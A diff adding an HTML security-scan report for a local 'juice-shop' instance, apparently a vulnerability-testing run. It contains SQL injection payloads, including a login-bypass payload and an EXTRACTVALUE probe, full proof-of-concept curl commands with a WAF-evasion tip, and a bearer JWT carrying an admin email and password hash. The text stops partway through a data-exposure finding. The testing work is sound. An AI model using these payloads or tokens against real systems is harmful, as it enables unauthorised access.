@@ -1,0 +1,2390 @@
+ <!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>SecScan Report - juice-shop</title>
+<style>
+body { margin: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif; color: #17202a; background: #f6f8fb; }
+header { background: #122033; color: white; padding: 28px 36px; }
+header h1 { margin: 0 0 8px; font-size: 28px; }
+header dl { display: grid; grid-template-columns: repeat(4, minmax(120px, 1fr)); gap: 12px; margin: 18px 0 0; }
+header dt { color: #b9c7d8; font-size: 12px; text-transform: uppercase; }
+header dd { margin: 4px 0 0; font-weight: 700; }
+main { padding: 28px 36px 48px; }
+section { margin-bottom: 28px; }
+.summary { display: grid; grid-template-columns: 220px 1fr; gap: 20px; align-items: stretch; }
+.risk { background: white; border: 1px solid #dce3ec; border-radius: 8px; padding: 18px; }
+.risk strong { display: block; font-size: 48px; line-height: 1; }
+.severity-grid { display: grid; grid-template-columns: repeat(5, 1fr); gap: 12px; }
+.sev { background: white; border: 1px solid #dce3ec; border-radius: 8px; padding: 14px; }
+.sev span { display: block; font-size: 12px; color: #526070; }
+.sev strong { font-size: 26px; }
+.critical strong { color: #9f1239; } .high strong { color: #c2410c; } .medium strong { color: #a16207; }
+table { width: 100%; border-collapse: collapse; background: white; border: 1px solid #dce3ec; border-radius: 8px; overflow: hidden; }
+th, td { text-align: left; border-bottom: 1px solid #edf1f5; padding: 10px 12px; vertical-align: top; }
+th { background: #eef3f8; font-size: 12px; text-transform: uppercase; color: #526070; }
+.badge { display: inline-block; padding: 2px 8px; border-radius: 999px; background: #e8eef5; font-size: 12px; font-weight: 700; }
+.remediation, .playbook { max-width: 520px; white-space: pre-wrap; }
+code { white-space: pre-wrap; word-break: break-word; }
+.empty { text-align: center; color: #637083; }
+</style>
+</head>
+<body>
+<header>
+  <h1>SecScan Security Report</h1>
+  <p>juice-shop</p>
+  <dl>
+    <div><dt>Generated</dt><dd>2026-05-23T12:53:50.573806+00:00</dd></div>
+    <div><dt>Checks</dt><dd>9</dd></div>
+    <div><dt>Findings</dt><dd>45</dd></div>
+    <div><dt>Risk Score</dt><dd>64/100</dd></div>
+  </dl>
+</header>
+<main>
+  <section class="summary">
+    <div class="risk"><span>Overall Risk</span><strong>64</strong><span>/100</span></div>
+    <div class="severity-grid"><div class="sev critical"><span>Critical</span><strong>0</strong></div>
+<div class="sev high"><span>High</span><strong>3</strong></div>
+<div class="sev medium"><span>Medium</span><strong>16</strong></div>
+<div class="sev low"><span>Low</span><strong>26</strong></div>
+<div class="sev info"><span>Info</span><strong>0</strong></div></div>
+  </section>
+  <section>
+    <h2>Check Status</h2>
+    <table><thead><tr><th>Check</th><th>Findings</th><th>Status</th><th>Elapsed</th></tr></thead><tbody><tr><td>auth</td><td>0</td><td>ok</td><td>0.00s</td></tr>
+<tr><td>authz</td><td>0</td><td>ok</td><td>0.00s</td></tr>
+<tr><td>data</td><td>3</td><td>ok</td><td>0.00s</td></tr>
+<tr><td>headers</td><td>39</td><td>ok</td><td>0.00s</td></tr>
+<tr><td>jwt</td><td>0</td><td>ok</td><td>0.00s</td></tr>
+<tr><td>redirect</td><td>0</td><td>ok</td><td>0.00s</td></tr>
+<tr><td>sqli</td><td>3</td><td>ok</td><td>0.00s</td></tr>
+<tr><td>ssrf</td><td>0</td><td>ok</td><td>0.00s</td></tr>
+<tr><td>xss</td><td>0</td><td>ok</td><td>0.00s</td></tr></tbody></table>
+  </section>
+  <section>
+    <h2>Findings</h2>
+    <table><thead><tr><th>Severity</th><th>Check</th><th>Title</th><th>Evidence</th><th>Remediation</th><th>Playbook</th></tr></thead><tbody><tr><td><span class="badge">High</span></td><td>sqli</td><td>SQL Injection (Boolean-Based) — http://localhost:3000/rest/user/login<br><small>medium confidence</small></td><td>True condition (&#x27;&#x27; OR &#x27;1&#x27;=&#x27;1&#x27;--&#x27;) and false condition (&#x27;&#x27; OR &#x27;1&#x27;=&#x27;2&#x27;--&#x27;) produced different responses: 773 byte size difference, content hashes differ (9fd98acc86cdc375 vs db2a02d8daccaff6). The true condition also showed access gain: injection changed status from 401 to 200, moving from restricted to successful access.<br><code>curl \
+  -X POST \
+  http://localhost:3000/rest/user/login \
+  -H &#x27;Host: localhost:3000&#x27; \
+  -H &#x27;Accept: application/json, text/plain, */*&#x27; \
+  -H &#x27;Origin: http://localhost:3000&#x27; \
+  -H &#x27;Referer: http://localhost:3000/&#x27; \
+  -H &#x27;Priority: u=0&#x27; \
+  -H &#x27;Connection: keep-alive&#x27; \
+  -H &#x27;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:150.0) Gecko/20100101 Firefox/150.0&#x27; \
+  -H &#x27;Content-Type: application/json&#x27; \
+  -H &#x27;Sec-Fetch-Dest: empty&#x27; \
+  -H &#x27;Sec-Fetch-Mode: cors&#x27; \
+  -H &#x27;Sec-Fetch-Site: same-origin&#x27; \
+  -H &#x27;Accept-Encoding: gzip, deflate, br, zstd&#x27; \
+  -H &#x27;Accept-Language: en-US,en;q=0.9&#x27; \
+  -H &#x27;Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc3OTU0MDc3MX0.UmP_0aIYFA7tjh5EOF5bMsb6r2704LKPz65d5DLK-rdbFyPXrX1uVywFde_e67G5tdo9_MII5oz0ZMg1NOaNvb5yu-tusXM0zKY6nYFz__i_FuXQ48J3x4mDRs9k0fB1N12EyEywnHAftGTH7ygiJChXQQlw7yNQd6WuEmJFXRQ&#x27; \
+  -H &#x27;Cookie: language=en&#x27; \
+  --data-raw &#x27;{&quot;email&quot;: &quot;&#x27;&quot;&#x27;&quot;&#x27; OR &#x27;&quot;&#x27;&quot;&#x27;1&#x27;&quot;&#x27;&quot;&#x27;=&#x27;&quot;&#x27;&quot;&#x27;1&#x27;&quot;&#x27;&quot;&#x27;--&quot;, &quot;password&quot;: &quot;admin123&quot;}&#x27;</code></td><td class="remediation">Use parameterised queries (prepared statements) for all database interactions. Never concatenate user-controlled input into SQL or NoSQL query strings. Apply an allowlist-based input validation layer as a secondary defence. For NoSQL databases, validate that query operators cannot be injected through request bodies — reject inputs that are not scalar types where scalars are expected. Consider deploying a WAF as a detection layer, not as the sole mitigation.</td><td class="playbook">## MANUAL VERIFICATION (5 STEPS)
+
+1. Send the baseline request. Note the response body size.
+2. Inject `&#x27; OR &#x27;1&#x27;=&#x27;1&#x27;--` into `email`. Note the response body size.
+3. Inject `&#x27; OR &#x27;1&#x27;=&#x27;2&#x27;--` into `email`. Note the response body size.
+4. True condition should return MORE data (or structurally different content).
+5. Repeat 3 times to rule out dynamic content. If diff is consistent: **CONFIRMED**.
+
+## IF AMBIGUOUS
+
+- Dynamic page elements (timestamps, nonces, ads) can cause size variations.  
+  Compare the actual JSON/HTML structure, not just byte count.
+- If the diff disappears on re-run, the page has unstable dynamic content.
+- Try a second true/false pair (e.g., `1 OR 1=1` vs `1 OR 1=2`).  
+  Consistent diff across two independent pairs = **high confidence**.
+
+## CLEANUP
+
+No data was extracted. No cleanup required.
+
+## POC CURL
+
+```bash
+curl \
+  -X POST \
+  http://localhost:3000/rest/user/login \
+  -H &#x27;Host: localhost:3000&#x27; \
+  -H &#x27;Accept: application/json, text/plain, */*&#x27; \
+  -H &#x27;Origin: http://localhost:3000&#x27; \
+  -H &#x27;Referer: http://localhost:3000/&#x27; \
+  -H &#x27;Priority: u=0&#x27; \
+  -H &#x27;Connection: keep-alive&#x27; \
+  -H &#x27;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:150.0) Gecko/20100101 Firefox/150.0&#x27; \
+  -H &#x27;Content-Type: application/json&#x27; \
+  -H &#x27;Sec-Fetch-Dest: empty&#x27; \
+  -H &#x27;Sec-Fetch-Mode: cors&#x27; \
+  -H &#x27;Sec-Fetch-Site: same-origin&#x27; \
+  -H &#x27;Accept-Encoding: gzip, deflate, br, zstd&#x27; \
+  -H &#x27;Accept-Language: en-US,en;q=0.9&#x27; \
+  -H &#x27;Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc3OTU0MDc3MX0.UmP_0aIYFA7tjh5EOF5bMsb6r2704LKPz65d5DLK-rdbFyPXrX1uVywFde_e67G5tdo9_MII5oz0ZMg1NOaNvb5yu-tusXM0zKY6nYFz__i_FuXQ48J3x4mDRs9k0fB1N12EyEywnHAftGTH7ygiJChXQQlw7yNQd6WuEmJFXRQ&#x27; \
+  -H &#x27;Cookie: language=en&#x27; \
+  --data-raw &#x27;{&quot;email&quot;: &quot;&#x27;&quot;&#x27;&quot;&#x27; OR &#x27;&quot;&#x27;&quot;&#x27;1&#x27;&quot;&#x27;&quot;&#x27;=&#x27;&quot;&#x27;&quot;&#x27;1&#x27;&quot;&#x27;&quot;&#x27;--&quot;, &quot;password&quot;: &quot;admin123&quot;}&#x27;
+```</td></tr>
+<tr><td><span class="badge">High</span></td><td>sqli</td><td>SQL Injection (Error-Based) — http://localhost:3000/rest/products/search<br><small>medium confidence</small></td><td>DB error signature in response body: &#x27;sqlite_error&#x27;<br><code>curl \
+  &#x27;http://localhost:3000/rest/products/search?q=%27+AND+EXTRACTVALUE%281%2CCONCAT%280x7e%2C%28SELECT+version%28%29%29%29%29--&#x27; \
+  -H &#x27;Host: localhost:3000&#x27; \
+  -H &#x27;Accept: application/json, text/plain, */*&#x27; \
+  -H &#x27;Referer: http://localhost:3000/&#x27; \
+  -H &#x27;Priority: u=0&#x27; \
+  -H &#x27;Connection: keep-alive&#x27; \
+  -H &#x27;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:150.0) Gecko/20100101 Firefox/150.0&#x27; \
+  -H &#x27;Sec-Fetch-Dest: empty&#x27; \
+  -H &#x27;Sec-Fetch-Mode: cors&#x27; \
+  -H &#x27;Sec-Fetch-Site: same-origin&#x27; \
+  -H &#x27;Accept-Encoding: gzip, deflate, br, zstd&#x27; \
+  -H &#x27;Accept-Language: en-US,en;q=0.9&#x27; \
+  -H &#x27;Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc3OTU0MDc3MX0.UmP_0aIYFA7tjh5EOF5bMsb6r2704LKPz65d5DLK-rdbFyPXrX1uVywFde_e67G5tdo9_MII5oz0ZMg1NOaNvb5yu-tusXM0zKY6nYFz__i_FuXQ48J3x4mDRs9k0fB1N12EyEywnHAftGTH7ygiJChXQQlw7yNQd6WuEmJFXRQ&#x27; \
+  -H &#x27;Cookie: language=en&#x27;</code></td><td class="remediation">Use parameterised queries (prepared statements) for all database interactions. Never concatenate user-controlled input into SQL or NoSQL query strings. Apply an allowlist-based input validation layer as a secondary defence. For NoSQL databases, validate that query operators cannot be injected through request bodies — reject inputs that are not scalar types where scalars are expected. Consider deploying a WAF as a detection layer, not as the sole mitigation.</td><td class="playbook">## MANUAL VERIFICATION (4 STEPS)
+
+1. Send the baseline request (no injection). Confirm no SQL error in response.
+2. Modify `q` to: `&#x27; AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--`  
+   Expected: response body contains `sqlite_error`.
+3. Try a second payload (e.g., `&#x27;&#x27;` — two single quotes).  
+   Expected: similar or different DB error, confirming SQL parsing.
+4. If steps 1–3 confirm: **CONFIRMED**.
+
+## IF AMBIGUOUS
+
+- Confirm the error does **not** appear in the baseline response.  
+  A pre-existing error indicates a server-side bug, not an injection.
+- Try URL-encoding the payload (`%27` for `&#x27;`).  
+  Some WAFs strip unencoded quotes; encoding bypasses the filter.
+- If the error appears with multiple distinct payloads: **high confidence**.
+
+## CLEANUP
+
+No data was extracted. No cleanup required.
+
+## POC CURL
+
+```bash
+curl \
+  &#x27;http://localhost:3000/rest/products/search?q=%27+AND+EXTRACTVALUE%281%2CCONCAT%280x7e%2C%28SELECT+version%28%29%29%29%29--&#x27; \
+  -H &#x27;Host: localhost:3000&#x27; \
+  -H &#x27;Accept: application/json, text/plain, */*&#x27; \
+  -H &#x27;Referer: http://localhost:3000/&#x27; \
+  -H &#x27;Priority: u=0&#x27; \
+  -H &#x27;Connection: keep-alive&#x27; \
+  -H &#x27;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:150.0) Gecko/20100101 Firefox/150.0&#x27; \
+  -H &#x27;Sec-Fetch-Dest: empty&#x27; \
+  -H &#x27;Sec-Fetch-Mode: cors&#x27; \
+  -H &#x27;Sec-Fetch-Site: same-origin&#x27; \
+  -H &#x27;Accept-Encoding: gzip, deflate, br, zstd&#x27; \
+  -H &#x27;Accept-Language: en-US,en;q=0.9&#x27; \
+  -H &#x27;Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc3OTU0MDc3MX0.UmP_0aIYFA7tjh5EOF5bMsb6r2704LKPz65d5DLK-rdbFyPXrX1uVywFde_e67G5tdo9_MII5oz0ZMg1NOaNvb5yu-tusXM0zKY6nYFz__i_FuXQ48J3x4mDRs9k0fB1N12EyEywnHAftGTH7ygiJChXQQlw7yNQd6WuEmJFXRQ&#x27; \
+  -H &#x27;Cookie: language=en&#x27;
+```</td></tr>
+<tr><td><span class="badge">High</span></td><td>sqli</td><td>SQL Injection (Error-Based) — http://localhost:3000/rest/user/login<br><small>medium confidence</small></td><td>Injection payload changed status from 200 to 500, indicating the payload broke query structure.<br><code>curl \
+  -X POST \
+  http://localhost:3000/rest/user/login \
+  -H &#x27;Host: localhost:3000&#x27; \
+  -H &#x27;Accept: application/json, text/plain, */*&#x27; \
+  -H &#x27;Origin: http://localhost:3000&#x27; \
+  -H &#x27;Referer: http://localhost:3000/&#x27; \
+  -H &#x27;Priority: u=0&#x27; \
+  -H &#x27;Connection: keep-alive&#x27; \
+  -H &#x27;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:150.0) Gecko/20100101 Firefox/150.0&#x27; \
+  -H &#x27;Content-Type: application/json&#x27; \
+  -H &#x27;Sec-Fetch-Dest: empty&#x27; \
+  -H &#x27;Sec-Fetch-Mode: cors&#x27; \
+  -H &#x27;Sec-Fetch-Site: same-origin&#x27; \
+  -H &#x27;Accept-Encoding: gzip, deflate, br, zstd&#x27; \
+  -H &#x27;Accept-Language: en-US,en;q=0.9&#x27; \
+  -H &#x27;Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc3OTU0MDc3MX0.UmP_0aIYFA7tjh5EOF5bMsb6r2704LKPz65d5DLK-rdbFyPXrX1uVywFde_e67G5tdo9_MII5oz0ZMg1NOaNvb5yu-tusXM0zKY6nYFz__i_FuXQ48J3x4mDRs9k0fB1N12EyEywnHAftGTH7ygiJChXQQlw7yNQd6WuEmJFXRQ&#x27; \
+  -H &#x27;Cookie: language=en&#x27; \
+  --data-raw &#x27;{&quot;email&quot;: &quot;&#x27;&quot;&#x27;&quot;&#x27;&quot;, &quot;password&quot;: &quot;admin123&quot;}&#x27;</code></td><td class="remediation">Use parameterised queries (prepared statements) for all database interactions. Never concatenate user-controlled input into SQL or NoSQL query strings. Apply an allowlist-based input validation layer as a secondary defence. For NoSQL databases, validate that query operators cannot be injected through request bodies — reject inputs that are not scalar types where scalars are expected. Consider deploying a WAF as a detection layer, not as the sole mitigation.</td><td class="playbook">## MANUAL VERIFICATION (4 STEPS)
+
+1. Send the baseline request (no injection). Confirm no SQL error in response.
+2. Modify `email` to: `&#x27;`  
+   Expected: response body contains `SQL error`.
+3. Try a second payload (e.g., `&#x27;&#x27;` — two single quotes).  
+   Expected: similar or different DB error, confirming SQL parsing.
+4. If steps 1–3 confirm: **CONFIRMED**.
+
+## IF AMBIGUOUS
+
+- Confirm the error does **not** appear in the baseline response.  
+  A pre-existing error indicates a server-side bug, not an injection.
+- Try URL-encoding the payload (`%27` for `&#x27;`).  
+  Some WAFs strip unencoded quotes; encoding bypasses the filter.
+- If the error appears with multiple distinct payloads: **high confidence**.
+
+## CLEANUP
+
+No data was extracted. No cleanup required.
+
+## POC CURL
+
+```bash
+curl \
+  -X POST \
+  http://localhost:3000/rest/user/login \
+  -H &#x27;Host: localhost:3000&#x27; \
+  -H &#x27;Accept: application/json, text/plain, */*&#x27; \
+  -H &#x27;Origin: http://localhost:3000&#x27; \
+  -H &#x27;Referer: http://localhost:3000/&#x27; \
+  -H &#x27;Priority: u=0&#x27; \
+  -H &#x27;Connection: keep-alive&#x27; \
+  -H &#x27;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:150.0) Gecko/20100101 Firefox/150.0&#x27; \
+  -H &#x27;Content-Type: application/json&#x27; \
+  -H &#x27;Sec-Fetch-Dest: empty&#x27; \
+  -H &#x27;Sec-Fetch-Mode: cors&#x27; \
+  -H &#x27;Sec-Fetch-Site: same-origin&#x27; \
+  -H &#x27;Accept-Encoding: gzip, deflate, br, zstd&#x27; \
+  -H &#x27;Accept-Language: en-US,en;q=0.9&#x27; \
+  -H &#x27;Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc3OTU0MDc3MX0.UmP_0aIYFA7tjh5EOF5bMsb6r2704LKPz65d5DLK-rdbFyPXrX1uVywFde_e67G5tdo9_MII5oz0ZMg1NOaNvb5yu-tusXM0zKY6nYFz__i_FuXQ48J3x4mDRs9k0fB1N12EyEywnHAftGTH7ygiJChXQQlw7yNQd6WuEmJFXRQ&#x27; \
+  -H &#x27;Cookie: language=en&#x27; \
+  --data-raw &#x27;{&quot;email&quot;: &quot;&#x27;&quot;&#x27;&quot;&#x27;&quot;, &quot;password&quot;: &quot;admin123&quot;}&#x27;
+```</td></tr>
+<tr><td><span class="badge">Medium</span></td><td>data</td><td>Sensitive Data Exposure (High Entropy) — http://localhost:3000/rest/continue-code<br><small>high confidence</small></td><td>High-entropy token exposed in response.<br><code>curl \
+  http://localhost:3000/rest/continue-code \
+  -H &#x27;Host: localhost:3000&#x27; \
+  -H &#x27;Accept: application/json, text/plain, */*&#x27; \
+  -H &#x27;Referer: http://localhost:3000/&#x27; \
+  -H &#x27;Connection: keep-alive&#x27; \
+  -H &#x27;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:150.0) Gecko/20100101 Firefox/150.0&#x27; \
+  -H &#x27;Sec-Fetch-Dest: empty&#x27; \
+  -H &#x27;Sec-Fetch-Mode: cors&#x27; \
+  -H &#x27;Sec-Fetch-Site: same-origin&#x27; \
+  -H &#x27;Accept-Encoding: gzip, deflate, br, zstd&#x27; \
+  -H &#x27;Accept-Language: en-US,en;q=0.9&#x27; \
+  -H &#x27;Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc3OTU0MDc3MX0.UmP_0aIYFA7tjh5EOF5bMsb6r2704LKPz65d5DLK-rdbFyPXrX1uVywFde_e67G5tdo9_MII5oz0ZMg1NOaNvb5yu-tusXM0zKY6nYFz__i_FuXQ48J3x4mDRs9k0fB1N12EyEywnHAftGTH7ygiJChXQQlw7yNQd6WuEmJFXRQ&#x27; \
+  -H &#x27;Cookie: language=en&#x27;</code></td><td class="remediation">Remove secrets and sensitive personal data from responses. Store secrets in a vault, redact error details in production, minimize PII returned by APIs, and ensure tokens and keys are rotated if exposure is confirmed.</td><td class="playbook">## MANUAL VERIFICATION
+
+1. Send the PoC request.
+2. Confirm the sensitive value appears in the response.
+3. Verify whether the current user is authorized to see that value.
+4. For secrets, assume exposure until the owning service confirms otherwise.
+
+## IF AMBIGUOUS
+
+- Suppress expected self-profile PII only when the page belongs to the same user.
+- Validate credit-card-like numbers with Luhn before reporting.
+- Ignore minified JavaScript and image payload entropy noise.
+
+## CLEANUP
+
+Rotate exposed secrets and remove sensitive data from logs or caches if confirmed.
+
+## POC CURL
+
+```bash
+curl \
+  http://localhost:3000/rest/continue-code \
+  -H &#x27;Host: localhost:3000&#x27; \
+  -H &#x27;Accept: application/json, text/plain, */*&#x27; \
+  -H &#x27;Referer: http://localhost:3000/&#x27; \
+  -H &#x27;Connection: keep-alive&#x27; \
+  -H &#x27;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:150.0) Gecko/20100101 Firefox/150.0&#x27; \
+  -H &#x27;Sec-Fetch-Dest: empty&#x27; \
+  -H &#x27;Sec-Fetch-Mode: cors&#x27; \
+  -H &#x27;Sec-Fetch-Site: same-origin&#x27; \
+  -H &#x27;Accept-Encoding: gzip, deflate, br, zstd&#x27; \
+  -H &#x27;Accept-Language: en-US,en;q=0.9&#x27; \
+  -H &#x27;Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc3OTU0MDc3MX0.UmP_0aIYFA7tjh5EOF5bMsb6r2704LKPz65d5DLK-rdbFyPXrX1uVywFde_e67G5tdo9_MII5oz0ZMg1NOaNvb5yu-tusXM0zKY6nYFz__i_FuXQ48J3x4mDRs9k0fB1N12EyEywnHAftGTH7ygiJChXQQlw7yNQd6WuEmJFXRQ&#x27; \
+  -H &#x27;Cookie: language=en&#x27;
+```</td></tr>
+<tr><td><span class="badge">Medium</span></td><td>data</td><td>Sensitive Data Exposure (High Entropy) — http://localhost:3000/rest/user/login<br><small>high confidence</small></td><td>High-entropy token exposed in response.<br><code>curl \
+  -X POST \
+  http://localhost:3000/rest/user/login \
+  -H &#x27;Host: localhost:3000&#x27; \
+  -H &#x27;Accept: application/json, text/plain, */*&#x27; \
+  -H &#x27;Origin: http://localhost:3000&#x27; \
+  -H &#x27;Referer: http://localhost:3000/&#x27; \
+  -H &#x27;Priority: u=0&#x27; \
+  -H &#x27;Connection: keep-alive&#x27; \
+  -H &#x27;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:150.0) Gecko/20100101 Firefox/150.0&#x27; \
+  -H &#x27;Content-Type: application/json&#x27; \
+  -H &#x27;Sec-Fetch-Dest: empty&#x27; \
+  -H &#x27;Sec-Fetch-Mode: cors&#x27; \
